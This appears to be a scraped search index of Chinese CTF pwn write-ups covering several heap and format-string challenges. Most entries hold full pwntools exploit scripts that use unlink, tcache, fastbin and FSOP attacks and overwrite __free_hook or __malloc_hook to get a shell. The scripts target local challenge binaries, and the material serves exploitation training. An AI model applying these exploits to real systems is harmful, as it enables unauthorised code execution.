sh.sendlineafter(\"4.show\\n\", \"3\") sh.sendlineafter(\"index:\\n\", str(idx)) sh.sendafter(\"content:\\n\", data) def show(idx): sh.sendlineafter(\"4.show\\n\", \"4\") sh.sendlineafter(\"index:\\n\", str(idx)) msg = sh.recvline() info(\"msg recv:{}\".format(msg)) return msg for i in range(7): ma(i, 0xf0, '{}'.format(i) * 0xf0) leak_addr = ma(7, 0x88, \"a\") LOG_ADDR(\"leak_heap_addr\", leak_addr) # 0x9f0960 ma(8, 0xf0, \"b\") ma(9, 0x80, \"c\") ma(0xa, 0x80, \"d\") ma(0xb, 0x80, \"/bin/sh\\x00\") for i in range(7): fr(i) # unlink target_addr = 0x602118 layout = [0, 0x81, target_addr - 0x18, target_addr - 0x10, \"a\" * 0x60, 0x80] ed(7, flat(layout)) fr(8) free_got = 0x601fa0 layout = [leak_addr + 0x190, leak_addr + 0x190, free_got, 0x602100] ed(7, flat(layout)) fr(4) fr(5) # tcache bin attack ma(0, 0x80, p64(0x6022b8)) ma(1, 0x80, \"a\") ma(4, 0x80, \"a\" * 8) # change key2 # leak libc addr msg = show(6) free_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) LOG_ADDR(\"free_addr\", free_addr) libc.address = free_addr - 0x97950 LOG_ADDR(\"libc_base_addr\", libc.address) # edit __free_hook to system-addr layout = [[libc.sym['__free_hook']] * 3, 0x602100] ed(7, flat(layout)) ed(4, p64(libc.sym['system'])) # free /bin/sh chunk to get shell fr(0xb) sh.interactive() 远程打效果： 引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-06-14","objectID":"/zh-cn/2021-06-14-ciscn-2019-es-4/:0:0","tags":["pwn"],"title":"ciscn_2019_es_4","uri":"/zh-cn/2021-06-14-ciscn-2019-es-4/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 一般来说，在libc-2.23.so中，能用unlink的题目，基本可以用unsorted bin attack + IO_FILE劫持IO_jump_t结构执行system(\"/bin/sh\")。不用能unlink的题目，但是能溢出修改unsorted bin chunk的size并布局unsorted bin chunk内容，都可以用这一招偷鸡。 修改unsorted bin的size为0x61， 然后从unsorted bin chunk的头部开始，布局如下：[/bin/sh\\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * \"\\x00\", fake_vtable_addr]，然后fake_vtable填的内容如下：[0, 0, 0, system_addr]。 Checksec\r运行环境为ubuntu 16.04，libc-2.23.so。 题目分析\r就是很常见的菜单题，有一个堆指针数组在bss段上，不过需要注意的有： allocate最多只能调用10次，但是edit能编辑到索引为0x1f的chunk的指针。 每次allocate和edit的固定大小为0x20，不能申请其他大小的chunk edit的次数是3次， 漏洞分析\r很基础的UAF 利用思路\r一般来说，UAF可以用来泄露地址。这里有两种利用思路，分别讲一下; 利用unlink： 利用UAF泄露出堆地址 利用fastbin attack，修改到某个chunk的size，更改为0x91，然后释放掉 利用show泄露出libc地址 利用unlink修改堆指针数组 修改__free_hook为system地址 释放带/bin/sh的块 利用unsorted bin attack + IO_FILE: 用同样的方法去泄露地址 布局IO_FILE结构，这里的IO_FILE结构会散落到多处，关键是要找到vtable等重要的内存单元 修改unsorted bin chunk的size为0x61 调用malloc，触发IO_flush_all_lock_up，刷新所有流，执行system(\"/bin/sh\") 利用流程如图所示： 最终EXP\rfrom pwn import * int16 = lambda x : int(x, base=16) LOG_ADDR = lamda: x, y: log.info(\"Addr: {} ===\u003e {}\".format(x, y)) sh = process(\"./wdb_2018_1st_babyheap\") cur_elf = sh.elf libc = sh.elf.libc context.arch=\"amd64\" initial_date = flat(0, 0x31, 0, 0x31) def allocate(idx, data=initial_date): if len(data) != 0x20: if isinstance(data, str): data += \"\\n\" else: data += b\"\\n\" sh.sendlineafter(\"Choice:\", \"1\") sh.sendlineafter(\"Index:\", str(idx)) sh.sendafter(\"Content:\", data) sh.recvline() def edit(idx, data): if len(data) != 0x20: if isinstance(data, str): data += \"\\n\" else: data += b\"\\n\" sh.sendlineafter(\"Choice:\", \"2\") sh.sendlineafter(\"Index:\", str(idx)) sh.sendafter(\"Content:\", data) sh.recvline() def show(idx): sh.sendlineafter(\"Choice:\", \"3\") sh.sendlineafter(\"Index:\", str(idx)) msg = sh.recvline() info(\"msg ===\u003e {}\".format(msg)) return msg def free(idx): sh.sendlineafter(\"Choice:\", \"4\") sh.sendlineafter(\"Index:\", str(idx)) def attack_unlink(): allocate(0) allocate(1) allocate(2) allocate(3) allocate(4, \"/bin/sh\\x00\") free(1) free(0) # leak heap addr msg = show(0) leak_heap_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_heap_addr\", leak_heap_addr) # fast bin attack free(1) allocate(5, flat(leak_heap_addr - 0x20)) allocate(6, \"a\") allocate(7, \"a\") target_addr = 0x602090 allocate(8, flat(target_addr - 0x18, target_addr - 0x10, 0x20, 0x90)) # edit 0 to set fake size edit(0, flat(0, \"\\x21\")) # unlink free(1) # leak libc addr msg = show(8) leak_libc_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc.address = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc.address) edit(6, p64(libc.sym['__free_hook'])[:-1]) edit(3, flat(libc.sym['system'])) free(4) sh.interactive() def attack_fsop(): allocate(0) allocate(1) allocate(2) allocate(3) allocate(4, \"/bin/sh\\x00\") free(1) free(0) # leak heap addr msg = show(0) leak_heap_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_heap_addr\", leak_heap_addr) edit(0, flat(leak_heap_addr - 0x10)) allocate(5, \"a\") allocate(6, flat(0, 0x91)) allocate(7, flat(0, leak_heap_addr - 0x20)) # prepare for vtable # leak libc addr free(1) msg = show(1) leak_libc_addr = u64(msg[:-1].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc.address = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc.address) # fsop edit(6, flat(\"/bin/sh\\x00\", 0x61, 0, libc.sym['_IO_list_all'] - 0x10)) edit(0, flat(0, 0, 0, libc.sym['system'])) sh.sendlineafter(\"Choice:\", \"1\") sh.sendlineafter(\"Index:\", str(8)) sh.interactive() attack_fsop() 远程打： unlink: FSOP: 引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-06-10","objectID":"/zh-cn/2021-06-10-wdb_2018_1st_babyheap/:0:0","tags":["pwn"],"title":"wdb_2018_1st_babyheap","uri":"/zh-cn/2021-06-10-wdb_2018_1st_babyheap/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 一般来说，在libc-2.23.so中，能用unlink的题目，基本可以用unsorted bin attack + IO_FILE劫持IO_jump_t结构执行system(\"/bin/sh\")。不用能unlink的题目，但是能溢出修改unsorted bin chunk的size并布局unsorted bin chunk内容，都可以用这一招偷鸡。 修改unsorted bin的size为0x61， 然后从unsorted bin chunk的头部开始，布局如下：[/bin/sh\\x00, 0x61 0, _IO_list_all - 0x10, 0, 1, 0xa8 * \"\\x00\", fake_vtable_addr]，然后fake_vtable填的内容如下：[0, 0, 0, system_addr]。 Checksec\r运行环境为ubuntu 16.04，libc-2.23.so。 题目分析\r最开始分配一个0x1820的chunk，用于管理所有的note结构。布局如下： 需要注意的是： 最后malloc的参数并不是用户输入的input_size，而是对齐到0x80的大小。但是记录的size确实输入的那个数。 在edit_note函数中，realloc的参数也被同样处理过 有一个read函数，必须填满size，否则会等待输入 使用status来判断note的使用状态，而不是指针 漏洞分析\r漏洞点就一个UAF： 利用思路\r一般来说，UAF可以用来泄露地址。这里有两种利用思路，分别讲一下; 利用unlink： 利用unsorted bin的fd指针分别泄露出heap地址和libc地址，这样就得到了最初那个0x1820大小的chunk的地址 利用realloc功能来构造unlink条件，结合uaf漏洞，修改某个ptr为ptr - 0x18，这个ptr在0x1820堆块上 利用edit修改atoi@got为system地址 输入/bin/sh拿shell 利用unsorted bin attack + IO_FILE: 用同样的方法去泄露地址 布局IO_FILE结构 修改unsorted bin chunk的size为0x61 调用malloc，触发IO_flush_all_lock_up，刷新所有流，执行system(\"/bin/sh\") 最终EXP\rfrom pwn import * sh = process('freenote_x64') int16 = lambda x : int(x, base=16) LOG_ADDR = lamda: x, y: log.info(\"Addr: {} ===\u003e {}\".format(x, y)) libc = ELF('libc-2.23.so') context.arch=\"amd64\" def list_note(): sh.sendlineafter(\"Your choice: \", \"1\") msg = sh.recvuntil(\"== 0ops Free Note ==\\n\") info(\"msg: {}\".format(msg)) return msg def new_note(length, data): sh.sendlineafter(\"Your choice: \", \"2\") sh.sendlineafter(\"Length of new note: \", str(length)) sh.sendafter(\"Enter your note: \", data) sh.recvline() def edit_note(idx, length, data): sh.sendlineafter(\"Your choice: \", \"3\") sh.sendlineafter(\"Note number: \", str(idx)) sh.sendlineafter(\"Length of note: \", str(length)) sh.sendafter(\"Enter your note: \", data) sh.recvline() def delete_note(idx): sh.sendlineafter(\"Your choice: \", \"4\") sh.sendlineafter(\"Note number: \", str(idx)) sh.recvline() def attack_unlink(): # leak addr new_note(0x80, \"a\" * 0x80) # 0 a new_note(0x100, \"a\" * 0x100) # 1 b new_note(0x80, \"a\" * 0x80) # 2 c new_note(0x80, \"a\" * 0x80) # 3 d delete_note(2) delete_note(0) # a ---\u003e c new_note(0x80, \"a\" * 0x80) # c delete_note(2) # c ---\u003e a # leak heap addr msg = list_note() idx = msg.find(b\"\\n\") leak_heap_addr = u64(msg[3:idx].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_heap_addr\", leak_heap_addr) new_note(0x80, \"b\" * 0x80) # a # leak libc addr msg = list_note() idx = msg.find(b\"\\n\") leak_libc_addr = u64(msg[3:idx].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr # realloc and unlink layout = [0, 0x101, leak_heap_addr-0x17d8 - 0x18, leak_heap_addr - 0x17d8 - 0x10, 0xe0 * \"a\", 0x100, 0x90] edit_note(1, 0x180, flat(layout, length=0x180, filler=\"a\")) delete_note(0) layout = [0, [1, 8, cur_elf.got['atoi']] * 2] edit_note(1, 0x180, flat(layout, length=0x180, filler=\"\\x00\")) edit_note(1, 8, flat(libc.sym['system'])) sh.sendlineafter(\"Your choice: \", \"/bin/sh\") sh.interactive() def attack_io_file(): # leak addr new_note(0x200, \"a\" * 0x200) # 0 a new_note(0x80, \"a\" * 0x80) # 1 b new_note(0x200, \"a\" * 0x200) # 2 c new_note(0x80, \"a\" * 0x80) # 3 d delete_note(2) delete_note(0) # a ---\u003e c new_note(0x200, \"a\" * 0x200) # c delete_note(2) # c ---\u003e a # leak heap addr msg = list_note() idx = msg.find(b\"\\n\") leak_heap_addr = u64(msg[3:idx].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_heap_addr\", leak_heap_addr) new_note(0x200, \"b\" * 0x200) # a # leak libc addr msg = list_note() idx = msg.find(b\"\\n\") leak_libc_addr = u64(msg[3:idx].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr io_list_all_addr = libc.sym['_IO_list_all'] layout = [\"a\" * 0x80, 0, 0x211] edit_note(1, 0x280, flat(layout, length=0x280, filler=\"a\")) # re-put unsorted bin delete_note(0) layout = [\"a\" * 0x80, \"/bin/sh\\x00\", 0x61, 0, io_list_all_addr - 0x10, 0, 1, 0xa8 * \"\\x00\", leak_heap_add","date":"2021-06-09","objectID":"/zh-cn/2021-06-09-jarvisoj-level6-x64/:0:0","tags":["pwn"],"title":"jarvisoj_level6_x64","uri":"/zh-cn/2021-06-09-jarvisoj-level6-x64/"},{"categories":["pwn-wp"],"content":"简介\rhouse of spirit是一种针对fastbin的堆攻击方法，其核心操作是在目标区域伪造fastbin chunk，然后释放该fake chunk，最后申请出来，从而实现对目标区域的读写。 题目分析\rChecksec\r函数分析\r漏洞点\r利用思路\r知识点\r利用过程\r步骤： EXP\r调试过程\r完整exp\r引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-06-06","objectID":"/zh-cn/2021-06-06-pwn-house-of-spirit/:0:0","tags":["pwn"],"title":"pwn-house-of-spirit","uri":"/zh-cn/2021-06-06-pwn-house-of-spirit/"},{"categories":["pwn-wp"],"content":"解题思路\r利用unsorted bin的fd指针，爆破修改低地址的第2个字节，劫持fastbin到stdout，修改flag为0xfbad1800，将_IO_write_base低字节改小一点，泄露出libc地址 同样的方法劫持__malloc_hook为one_gadget即可getshell Checksec\r漏洞分析\r可以修改chunk的内容，溢出修改字节由用户可控，即为堆溢出写。 EXP\rfrom pwn import * LOG_ADDR = lambda x, y: info(\"{} ===\u003e {}\".format(x, hex(y))) int16 = lambda x: int(x, base=16) sh =process(\"./npuctf_2020_bad_guy\") libc = ELF(\"libc-2.23.so\") context.arch = \"amd64\" gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147] def add(idx, size, data=\"a\"): sh.sendlineafter(\"\u003e\u003e \", \"1\") sh.sendlineafter(\"Index :\", str(idx)) sh.sendlineafter(\"size: \", str(size)) sh.sendafter(\"Content:\", data) def edit(idx, size, data=\"a\"): sh.sendlineafter(\"\u003e\u003e \", \"2\") sh.sendlineafter(\"Index :\", str(idx)) sh.sendlineafter(\"size: \", str(size)) sh.sendafter(\"content: \", data) def free(idx): sh.sendlineafter(\"\u003e\u003e \", \"3\") sh.sendlineafter(\"Index :\", str(idx)) def attack(): # hijack stdout add(0, 0x10) add(1, 0x10) add(2, 0x60) add(3, 0x10) free(2) # fake size edit(0, 0x20, b\"a\" * 0x18 + p64(0x91)) free(1) add(1, 0x10) num = \"0x55\" edit(1, 0x30, b\"a\" * 0x18 + p64(0x71) + p8(0xdd) + p8(int16(num))) add(2, 0x60) layout = [0x33 * \"\\x00\", 0xfbad1800, 0, 0, 0, \"\\x58\"] add(3, 0x60, flat(layout)) msg = sh.recvn(8) leak_libc_addr = u64(msg) libc_base_addr = leak_libc_addr - 0x3c56a3 LOG_ADDR(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr free(2) # hijack malloc_hook edit(1, 0x30, b\"a\" * 0x18 + p64(0x71) + p64(libc.sym[\"__malloc_hook\"] - 0x23)) add(2, 0x60) one_gadget = libc.offset_to_vaddr(gadgets[3]) payload = b\"a\" * 0x13 + p64(one_gadget) add(4, 0x60, payload) # get shell sh.sendlineafter(\"\u003e\u003e \", \"1\") sh.sendlineafter(\"Index :\", str(5)) sh.sendlineafter(\"size: \", str(0x10)) sh.interactive() if __name__ == '__main__': while True: try: attack() break except: sh.close() sh = process(\"./npuctf_2020_bad_guy\") 远程打： 引用与参考\r1、My Blog 2、Ctf Wiki ","date":"2021-06-04","objectID":"/zh-cn/2021-06-04-npuctf-2020-bad-guy/:0:0","tags":["pwn"],"title":"npuctf_2020_bad_guy","uri":"/zh-cn/2021-06-04-npuctf-2020-bad-guy/"},{"categories":["pwn-wp"],"content":"题目分析\r简单的格式化字符串，修改got@puts为main函数地址制造循环即可： 先制造循环 修改printf@got为system@plt 输入/bin/sh获取shell 最终EXP\rfrom pwn import * sh:tube = process('./PicoCTF_2018_echo_back') cur_elf:ELF = all_parsed_args['cur_elf'] puts_got_addr = cur_elf.got['puts'] printf_got_addr = cur_elf.got['printf'] system_plt_addr = cur_elf.plt['system'] main_addr = cur_elf.sym['main'] context.arch = \"i386\" payload = fmtstr_payload(offset=7, writes={puts_got_addr: main_addr}, write_size=\"short\", write_size_max=\"short\") sh.recv() sh.sendline(payload) payload = fmtstr_payload(offset=7, writes={printf_got_addr: system_plt_addr}, write_size=\"short\", write_size_max=\"short\") sh.recv() sleep(2) sh.sendline(payload) sh.recv() sleep(2) # sh.sendline(\"/bin/sh\") sh.sendline('cat flag') sh.interactive() 远程打： 引用与参考\r1、My Blog ","date":"2021-06-02","objectID":"/zh-cn/2021-06-02-picoctf-2018-echo-back/:0:0","tags":["pwn"],"title":"picoctf_2018_echo_back","uri":"/zh-cn/2021-06-02-picoctf-2018-echo-back/"},{"categories":["pwn-wp"],"content":"题目分析\r经典的堆的格式化字符串，找一个指针链作为跳板即可。直接上exp。这里我直接使用ebp指针链来攻击。 最终EXP\rfrom pwn import * sh = process(\"./\") int16 = lambda x : int(x, base=16) LOG_ADDR = lamda: x, y: log.info(\"Addr: {} ===\u003e {}\".format(x, y)) gadgets = [0x3a80c, 0x3a80e, 0x3a812, 0x3a919, 0x5f065, 0x5f066] libc = ELF(\"libc-2.23.so\") context.arch=\"i386\" sh.recvlines(3) sh.sendline(\"%6$p,%19$p\") msg = sh.recvline() stack_addr, libc_addr = msg[:-1].split(b\",\") stack_addr = int16(stack_addr.decode()) libc_addr = int16(libc_addr.decode()) LOG_ADDR(\"stack_addr\", stack_addr) LOG_ADDR(\"libc_addr\", libc_addr) libc.address = libc_addr - 247 - libc.sym['__libc_start_main'] LOG_ADDR(\"libc_base_addr\", libc.address) one_gadget = libc.offset_to_vaddr(gadgets[0]) # get ebp low addr low_1_b = stack_addr \u0026 0xff # change ebp--\u003eaddr to retaddr payload = \"%{}c%6$hhn\".format(low_1_b + 4).ljust(0x18, \"a\") sh.sendline(payload) sh.recv() sleep(3) # change retaddr to one_gadget payload = \"%{}c%10$hn\".format(one_gadget \u0026 0xffff).ljust(0x18, \"a\") sh.sendline(payload) sh.recv() sleep(3) # change ebp--\u003eaddr to retaddr (high addr) payload = \"%{}c%6$hhn\".format(low_1_b + 4 + 2).ljust(0x10, \"a\") sh.sendline(payload) sh.recv() sleep(3) # change retaddr to one_gadget(high addr) payload = \"%{}c%10$hn\".format((one_gadget \u003e\u003e 16) \u0026 0xffff).ljust(0x18, \"a\") sh.sendline(payload) sh.recv() sleep(3) # recover ebp--\u003eaddr payload = \"%{}c%6$hhn\".format(low_1_b + 0x10).ljust(0x18, \"a\") sh.sendline(payload) sh.recv() sleep(3) sh.sendline(\"quit\") sh.interactive() 远程打： 引用与参考\r1、My Blog ","date":"2021-06-02","objectID":"/zh-cn/2021-06-02-hitcontraining-playfmt/:0:0","tags":["pwn"],"title":"hitcontraining_playfmt","uri":"/zh-cn/2021-06-02-hitcontraining-playfmt/"},{"categories":["pwn-wp"],"content":"总结\r本题比较简单，就是题目流程比较复杂一点，用到的知识点就一个： 当chunk被放置到unsorted bin中时，其fd指针会指向main_arena+88这个地址，可以用来泄露libc地址 Checksec\r保护全开，题目运行环境为ubuntu 16.04， libc-2.23.so。 题目分析\r题目实现了对书的管理，包括章节、主题等。书所需要的内存都是从堆上分配的。 首先，分配0x90大小的内存，存放书的信息，结构如下： 然后，每一个章节的结构，也是0x90大小的chunk，内存布局如下： 然后每个section都是大小为0x40的chunk，其内存布局如下： text_ptr对应的大小由用户指定，输入大小不超过0x100 漏洞分析\r漏洞点有4处，有两处在add_text函数中： 第40行可以输入负数绕过校验，第45和47行，如果输入小于0x100的正数，则会越界写。 第三处在remove_section函数中： 这里存在一个UAF漏洞。 第四出在updapte函数中： 同样是会越界写，指定了写的大小为0x100。 其实还有一个，就是我标注的read_off_by_one函数，会越界写一个字节。但是也要注意，这个函数里有memset(addr, 0, len)，会把内存置为0。 利用思路\r利用思路很多，因为题目漏洞给得实在是太多了，分享我的利用过程如下： 分配一个0x100大小的chunk，作为一个存储text的内存块，前面紧挨着一个0x90的内存块，可以被用作chapter 使用掉高地址的chapter，然后update低地址的text块。由于会把0xff的内存刷为0，所以必须要构造0x100大小的text内存块。直接填满0x100个a后。 使用book_preview，就会打印出unsorted bin的fd内容，得到libc地址 用update的越界写，修改某个section的text_ptr指针，修改为__free_hook的地址 然后update那个section的text，就是在往__free_hook写内容，填上system地址 释放带有/bin/sh的内存块，即可获得shell 最终EXP\r泄露地址： 修改text_ptr： 修改__free_hook为system地址： from pwn import * LOG_ADDR = lambda x, y: info(\"{} ===\u003e {}\".format(x, hex(y))) sh = process(\"./pwn\") libc = ELF('libc-2.23.so') context.update(arch=\"amd64\", os=\"linux\", endian=\"little\") def add_book(book_name): sh.sendlineafter(\"Name of the book you want to create: \", book_name) def add_chapter(chapter_name=\"abc\"): assert len(chapter_name) \u003c= 20, \"len error!\" sh.sendlineafter(\"\\nYour choice:\", \"1\") sh.sendlineafter(\"\\nChapter name:\", chapter_name) def add_section(chapter_name=\"abc\", section_name=\"123\"): sh.sendlineafter(\"\\nYour choice:\", \"2\") sh.sendlineafter(\"\\nWhich chapter do you want to add into:\", chapter_name) leak_msg = sh.recvline() log.info(\"msg recv===\u003e{}\".format(leak_msg)) sh.sendlineafter(\"Section name:\", section_name) return leak_msg def add_text(section_name=\"123\", size:int=0x80, text=\"a\"): sh.sendlineafter(\"\\nYour choice:\", \"3\") sh.sendlineafter(\"\\nWhich section do you want to add into:\", section_name) sh.sendlineafter(\"\\nHow many chapters you want to write:\", str(size)) sh.sendlineafter(\"\\nText:\", text) def remove_chapter(chapter_name=\"abc\"): sh.sendlineafter(\"\\nYour choice:\", \"4\") sh.sendlineafter(\"\\nChapter name:\", chapter_name) def remove_section(section_name=\"123\"): sh.sendlineafter(\"\\nYour choice:\", \"5\") sh.sendlineafter(\"\\nSection name:\", section_name) def remove_text(section_name=\"123\"): sh.sendlineafter(\"\\nYour choice:\", \"6\") sh.sendlineafter(\"\\nSection name:\", section_name) def book_preview(): sh.sendlineafter(\"\\nYour choice:\", \"7\") sh.recvuntil(\"\\nBook:\") msg = sh.recvuntil(\"\\n==========================\") log.info(\"msg recv:{}\".format(msg)) return msg def update(mode=0, old_name=\"abc\", new_name=\"efg\"): sh.sendlineafter(\"\\nYour choice:\", \"8\") sh.recvuntil(\"\\nWhat to update?(Chapter/Section/Text):\") if mode == 0: sh.sendline(\"Chapter\") sh.sendlineafter(\"\\nChapter name:\", old_name) sh.sendlineafter(\"\\nNew Chapter name:\", new_name) sh.recvuntil(\"\\nUpdated\") elif mode == 1: sh.sendline(\"Section\") sh.sendlineafter(\"\\nSection name:\", old_name) sh.sendlineafter(\"\\nNew Section name:\", new_name) sh.recvuntil(\"\\nUpdated\") else: sh.sendline(\"Text\") sh.sendlineafter(\"\\nSection name:\", old_name) sh.sendafter(\"\\nNew Text:\", new_name) sh.recvuntil(\"\\nUpdated\") # leak libc addr add_book(\"xxe\") add_chapter(\"a\") add_section(\"a\", \"a.a\") add_text(\"a.a\", 0xf0, \"a.a.a\") add_chapter(\"b\") add_section(\"b\", \"b.a\") remove_chapter(\"b\") update(2, \"a.a\", \"a\" * 0x100) msg = book_preview() idx = msg.index(b\"\\x7f\") leak_libc_addr = u64(msg[idx-5:idx + 1].ljust(8, b\"\\x00\")) LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr # recover update(2, \"a.a\", flat(\"a\"*0xf0, 0, 0x91)) add_chapter(\"b\") add_section(\"b\", \"b.a\") remove_text(\"a.a\") add_text(\"a.a\", 0xb0, \"a.a.b\") # change section's text_ptr add_section(\"a\", \"/bin/sh\") layout = [0xb0 * \"a\", 0, 0x41, \"/bin/sh\".ljust(8, \"\\x00\"), [0] * 3, libc.sym[\"__free_hook\"], 32] update(2, \"a.a\", flat(layout, length=0x100, filler=\"\\x00\")) # fil","date":"2021-06-01","objectID":"/zh-cn/2021-06-01-ogeek2019-bookmanager/:0:0","tags":["pwn"],"title":"OGeek2019-bookmanager","uri":"/zh-cn/2021-06-01-ogeek2019-bookmanager/"},{"categories":["pwn-wp"],"content":"能在buuctf上打比赛还是很舒服的，两道pwn题比较基础，wp就随便写一下啦！ 1、ticket\rChecksec\r运行环境为ubuntu16.04，libc-2.23.so 题目分析\r常见的菜单题，这里主要分析一下bss段的数据分布： 需要注意的地方有： 可以添加0≤ idx \u003c=5的ticket堆块，但是只能删除idx \u003c 3的ticket堆块 基本上围绕ticket的操作都是以heap_size来进行判断的，而且释放堆块后对应的大小会置为0 edit_info和show_info似乎并没有什么用 漏洞分析\r漏洞点在于两个地方，都在del_ticket函数中。 第一处是未校验索引大小，使得索引可以为负数。 第二处是存在UAF，可以利用残留信息泄露出libc地址。释放堆块的时候只把存储size的地方置为了0，指针没有置空。 利用思路\r在bss堆布局可以看到，age的值可控，因此可以将age写为bss地址，然后释放掉bss_fake_chunk，控制索引为2、3的chunk的大小，可以越界写。 利用步骤即为： 利用unsorted bin残留的信息泄露出libc地址 利用del_ticket(-3)释放bss_fake_chunk 控制chunk的大小，使得能越界写chunk 利用越界写，构造一个freed 0x70大小的chunk，修改其fd为__malooc_hook - 0x23 利用realloc + one_gadget来获取shell 最终exp\r调试过程： 释放假的chunk： 越界修改fd： 修改realloc_hook和malloc_hook： from pwn import * LOG_ADDR = lambda x, y: \"{} ---\u003e {}\".format(x, hex(y)) sh = process('./ticket') libc = ELF('./libc-2.23.so') gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147] context.update(arch=\"amd64\", endian=\"little\", os='linux') def welcome(name, saying, age:int): sh.sendafter(\"Your name: \\n\", name) sh.sendafter(\"what do you want to say before take off(wu hu qi fei): \\n\", saying) sh.sendlineafter(\"Your age: \\n\", str(age)) def add_ticket(idx, size): sh.sendlineafter(\"\u003e\u003e \", '1') sh.sendlineafter(\"Index: \\n\", str(idx)) sh.sendlineafter(\"Remarks size: \\n\", str(size)) sh.recvline() def del_ticket(idx): sh.sendlineafter(\"\u003e\u003e \", '2') sh.sendlineafter(\"Index: \\n\", str(idx)) sh.recvline() def edit_ticket(idx, remark): sh.sendlineafter(\"\u003e\u003e \", '3') sh.sendlineafter(\"Index: \\n\", str(idx)) sh.sendafter(\"Your remarks: \\n\", remark) sh.recvline() def show_ticket(idx): sh.sendlineafter(\"\u003e\u003e \", '4') sh.sendlineafter(\"Index: \\n\", str(idx)) msg = sh.recvline() log.info(\"msg recv:{}\".format(msg)) return msg # construct a fake-chunk at bss segment welcome(\"xxxx\", \"xxxx\", 0x6020e0) add_ticket(1, 0x21) # chunk1 add_ticket(2, 0x100) add_ticket(3, 0x10) add_ticket(5, 0x21) # free fake-chunk del_ticket(-3) # re-malloc fake-chunk by chunk0 add_ticket(0, 0x18) # recover chunk2's size and reset chunk3's size edit_ticket(0, p64(0x100) + p64(0)) # leak libc addr del_ticket(2) add_ticket(2, 0x100) msg = show_ticket(2) leak_libc_addr = u64(msg[-7:-1] + b\"\\x00\\x00\") LOG_ADDR(\"leak_libc_addr\", leak_libc_addr) libc_base_addr = leak_libc_addr - 0x3c4b20 - 88 LOG_ADDR(\"libc_base_addr\", libc_base_addr) libc.address = libc_base_addr # calc some useful address target_addr = libc.sym[\"__malloc_hook\"] - 0x23 system_addr = libc.sym['system'] realloc_addr = libc.sym['realloc'] one_gadget = libc.offset_to_vaddr(gadgets[1]) # change chunk2's size to overflow edit_ticket(0, p64(0x10000)) # get freed 0x70 chunk del_ticket(1) add_ticket(1, 0x60) del_ticket(1) # change free-chunk's fd-ptr to target_addr layout = [[0] * 32, 0x110, 0x21, [0] * 3, 0x31, [0] * 5, 0x71, target_addr] edit_ticket(2, flat(layout)) # fastbin attack add_ticket(1, 0x60) add_ticket(3, 0x60) layout = [0xb * \"a\", one_gadget, realloc_addr + 0xd] edit_ticket(3, flat(layout)) # get shell by malloc_hook(one_gadget) sh.sendlineafter(\"\u003e\u003e \", \"5\") sh.interactive() 远程打： 2、 Card\rChecksec\r运行环境为ubuntu18.04， libc-2.27.so 题目分析\r写得花里胡哨的菜单题，有malloc、free、edit、show功能，先来看bss段布局： 分布很简单，左边存储用户输入的大小，右边存储分配的指针 需要注意的有： 所有的chunk的大小限定在0-256之间 根据libc判断出来堆会使用tcache bin机制 漏洞分析\rcall函数存在一个off by one： 可以直接把0-256之间的每个数带进去算一遍，很多数都会使得v0+v1 = v0+1，部分数会让v1计算得到0。 利用思路\r带有tcache bin机制的off by one，直接利用unlink，搞个0x90---0x20---0x90的三明治，然后覆盖__free_hook为system，释放带有/bin/sh的块即可获得shell。 详细利用步骤为： 填满0x90大小的tcache bin 构造三明治布局，0x90---0x20---0x90 利用off by one和unlink，得到0x140的块，并包含释放状态的0x20的堆块 利用堆残留指针泄露出libc地址 修改freed chunk 0x20的fd指针为__free_hook地址 tcache bin posioning覆盖__free_hook为system地址 释放带有/bin/sh的块获取shell 最终exp\r调试过程： off by one修改pre_inuse位： unlink： 泄露地址并修改fd指针： from pwn import * LOG_ADDR = lambda x, y: \"{} ---\u003e {}\".format(x, hex(y)) sh = process('./pwn') libc = ELF('./libc.so') context.update(arch=\"amd64\", os='linux', endian=\"little\") def fight(idx, size, data=\"a\"): sh.sendlineafter(\"choice:\", \"1\") sh.sendlineafter(\"please choice your card:\", str(idx)) sh.sendlineafter(\"Infuse p","date":"2021-05-29","objectID":"/zh-cn/2021-05-29-dasctf-buuctf-may-pwn-wp/:0:0","tags":["pwn"],"title":"DASCTF_BUUCTF_May_pwn_wp","uri":"/zh-cn/2021-05-29-dasctf-buuctf-may-pwn-wp/"},{"categories":["pwn-wp"],"content":"总结\r根据本题，学习与收获有： 刚开始尝试利用read的返回值来构造execve的syscall，后来发现基本没有办法。后来查了下资料，才知道需要从alarm函数的返回值进行利用。虽然之前一直都知道alarm函数的功能，但是并不清楚其返回值是啥。 根据C语言alarm()函数：设置信号传送闹钟_C语言中文网 (biancheng.net)的解释，alarm()用来设置信号SIGALRM 在经过参数seconds 指定的秒数后传送给目前的进程。如果闹钟设置成功，那么之前设置的闹钟会被取消, 